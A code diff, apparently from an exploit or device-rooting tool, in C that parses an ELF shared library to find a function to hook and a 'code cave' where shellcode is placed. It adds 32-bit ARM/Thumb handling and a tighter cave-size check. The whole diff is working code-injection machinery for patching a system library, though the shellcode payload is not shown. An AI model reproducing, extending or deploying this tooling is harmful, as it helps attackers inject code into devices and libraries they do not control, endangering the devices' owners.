@@ -5,48 +5,40 @@
 #include <linux/elf.h>
 #include <stdio.h>
 
-/* Find shellcode placement: use tail_off if it fits in its page's remaining slack,
- * otherwise fall back to the largest zero run (alignment padding) inside the
- * executable PT_LOAD segment. Sets *out_off to the chosen file offset. */
+#ifdef __aarch64__
+typedef Elf64_Ehdr ElfN_Ehdr;
+typedef Elf64_Phdr ElfN_Phdr;
+typedef Elf64_Shdr ElfN_Shdr;
+typedef Elf64_Sym  ElfN_Sym;
+#else
+typedef Elf32_Ehdr ElfN_Ehdr;
+typedef Elf32_Phdr ElfN_Phdr;
+typedef Elf32_Shdr ElfN_Shdr;
+typedef Elf32_Sym  ElfN_Sym;
+#endif
+
 static int find_code_cave(int fd, uint64_t exec_off, uint64_t exec_filesz,
                            uint64_t tail_off, size_t shellcode_size,
-                           uint64_t *out_off) {
+                           uint64_t *out_off,
+                           uint64_t next_seg_off) {
     long pagesize = sysconf(_SC_PAGESIZE);
-    uint64_t page_off = tail_off & ((uint64_t)pagesize - 1);
-    uint64_t slack = page_off ? (uint64_t)pagesize - page_off : 0;
-    if (shellcode_size <= slack) {
+    uint64_t gap = 0;
+    uint64_t page_off, page_slack, usable;
+
+    if (next_seg_off > tail_off)
+        gap = next_seg_off - tail_off;
+
+    page_off = tail_off & ((uint64_t)pagesize - 1);
+    page_slack = page_off ? (uint64_t)pagesize - page_off : 0;
+    usable = gap ? (gap < page_slack ? gap : page_slack) : page_slack;
+
+    if (shellcode_size <= usable) {
         *out_off = tail_off;
         return 0;
     }
 
-    printf("shellcode (%zu) exceeds tail-page slack (%llu bytes)\n",
-           shellcode_size, (unsigned long long)slack);
-
-    if (lseek64(fd, exec_off, SEEK_SET) < 0) return 1;
-    uint64_t run_start = 0, run_len = 0, max_run_len = 0;
-    char page[4096];
-    for (uint64_t done = 0; done < exec_filesz; done += sizeof(page)) {
-        size_t chunk = exec_filesz - done;
-        if (chunk > sizeof(page)) chunk = sizeof(page);
-        ssize_t n = read(fd, page, chunk);
-        if (n <= 0) break;
-        for (ssize_t i = 0; i < n; i++) {
-            if (page[i] == 0) {
-                if (!run_len) run_start = exec_off + done + (uint64_t)i;
-                if (++run_len >= shellcode_size) {
-                    printf("using code cave at 0x%llx\n", (unsigned long long)run_start);
-                    *out_off = run_start;
-                    return 0;
-                }
-                if (run_len > max_run_len) max_run_len = run_len;
-            } else {
-                run_len = 0;
-            }
-        }
-    }
-
-    printf("no code cave large enough (need %zu, largest found %llu) - DEVICE NOT SUPPORTED\n",
-           shellcode_size, (unsigned long long)max_run_len);
+    printf("no safe cave: tail slack %llu, gap to next segment %llu, need %zu - DEVICE NOT SUPPORTED\n",
+           (unsigned long long)page_slack, (unsigned long long)gap, shellcode_size);
     return 1;
 }
 
@@ -62,7 +54,7 @@ int find_hook_target(const char *libcxx, const char *symname,
         return 1;
     }
 
-    Elf64_Ehdr hdr;
+    ElfN_Ehdr hdr;
     if (read(fd, (char *)&hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)) {
         printf("read ELF header from %s failed: %s\n", libcxx, strerror(errno));
         close(fd); return 1;
@@ -75,38 +67,42 @@ int find_hook_target(const char *libcxx, const char *symname,
         printf("lseek64 e_phoff failed: %s\n", strerror(errno));
         close(fd); return 1;
     }
-    if (hdr.e_phentsize != sizeof(Elf64_Phdr)) {
+    if (hdr.e_phentsize != sizeof(ElfN_Phdr)) {
         printf("invalid phentsize: %d\n", hdr.e_phentsize);
         close(fd); return 1;
     }
 
     uint64_t executable_off = 0, executable_filesz = 0;
     uint64_t executable_vaddr = 0;
+    uint64_t next_seg_off = 0;
+    int found_exec = 0;
     for (int i = 0; i < hdr.e_phnum; i++) {
-        Elf64_Phdr phdr;
+        ElfN_Phdr phdr;
         if (read(fd, (char *)&phdr, sizeof(phdr)) < 0) {
             printf("read phdr[%d] failed: %s\n", i, strerror(errno));
             close(fd); return 1;
         }
-        if (phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X)) {
+        if (!found_exec && phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X)) {
             *payload_target   = phdr.p_offset + phdr.p_filesz;
             executable_off    = phdr.p_offset;
             executable_filesz = phdr.p_filesz;
             executable_vaddr  = phdr.p_vaddr;
-            break;
+            found_exec = 1;
+        } else if (found_exec && phdr.p_type == PT_LOAD && !next_seg_off) {
+            next_seg_off = phdr.p_offset;
         }
     }
 
-    if (executable_off == 0 && executable_vaddr == 0) {
+    if (!found_exec) {
         printf("no executable PT_LOAD segment found in %s\n", libcxx);
         close(fd); return 1;
     }
 
-    if (lseek64(fd, hdr.e_shoff + hdr.e_shstrndx * sizeof(Elf64_Shdr), SEEK_SET) < 0) {
+    if (lseek64(fd, hdr.e_shoff + hdr.e_shstrndx * sizeof(ElfN_Shdr), SEEK_SET) < 0) {
         printf("lseek64 shstrndx failed: %s\n", strerror(errno));
         close(fd); return 1;
     }
-    Elf64_Shdr str_shdr;
+    ElfN_Shdr str_shdr;
     if (read(fd, (char *)&str_shdr, sizeof(str_shdr)) < 0) {
         printf("read shstrndx failed: %s\n", strerror(errno));
         close(fd); return 1;
@@ -114,8 +110,8 @@ int find_hook_target(const char *libcxx, const char *symname,
 
     uint64_t dynstr = 0, dynsym_offset = 0, dynsym_size = 0;
     for (int i = 0; i < hdr.e_shnum; i++) {
-        Elf64_Shdr shdr;
-        if (lseek64(fd, hdr.e_shoff + i * sizeof(Elf64_Shdr), SEEK_SET) < 0) {
+        ElfN_Shdr shdr;
+        if (lseek64(fd, hdr.e_shoff + i * sizeof(ElfN_Shdr), SEEK_SET) < 0) {
             printf("lseek64 shdr[%d] failed: %s\n", i, strerror(errno));
             close(fd); return 1;
         }
@@ -142,9 +138,9 @@ int find_hook_target(const char *libcxx, const char *symname,
         close(fd); return 1;
     }
 
-    for (int i = 0; i < (int)(dynsym_size / sizeof(Elf64_Sym)); i++) {
-        Elf64_Sym sym;
-        if (lseek64(fd, dynsym_offset + i * sizeof(Elf64_Sym), SEEK_SET) < 0) {
+    for (int i = 0; i < (int)(dynsym_size / sizeof(ElfN_Sym)); i++) {
+        ElfN_Sym sym;
+        if (lseek64(fd, dynsym_offset + i * sizeof(ElfN_Sym), SEEK_SET) < 0) {
             printf("lseek64 dynsym[%d] failed: %s\n", i, strerror(errno));
             close(fd); return 1;
         }
@@ -163,7 +159,11 @@ int find_hook_target(const char *libcxx, const char *symname,
         }
         name[sizeof(name) - 1] = 0;
         if (strcmp(name, symname) == 0) {
-            *hook_target = sym.st_value - executable_vaddr + executable_off;
+            uint64_t val = sym.st_value;
+#ifndef __aarch64__
+            val &= ~(uint64_t)1;
+#endif
+            *hook_target = val - executable_vaddr + executable_off;
             break;
         }
     }
@@ -182,6 +182,7 @@ int find_hook_target(const char *libcxx, const char *symname,
         close(fd); return 1;
     }
 
+#ifdef __aarch64__
     for (int adv = 0; adv < 2; adv++) {
         switch (*first_instruction) {
         case 0xd503233f: /* PACIASP  */
@@ -202,9 +203,22 @@ int find_hook_target(const char *libcxx, const char *symname,
         }
         break;
     }
+#else
+    {
+        uint16_t first_hw = (uint16_t)(*first_instruction & 0xffff);
+        if ((first_hw >> 11) < 0x1d) {
+            uint16_t second_hw = (uint16_t)((*first_instruction >> 16) & 0xffff);
+            if ((second_hw >> 11) >= 0x1d) {
+                printf("16-bit first instruction followed by start of 32-bit - would split it\n");
+                close(fd); return 1;
+            }
+        }
+    }
+#endif
 
     if (find_code_cave(fd, executable_off, executable_filesz,
-                       *payload_target, shellcode_size, payload_target)) {
+                       *payload_target, shellcode_size, payload_target,
+                       next_seg_off)) {
         close(fd); return 1;
     }
 
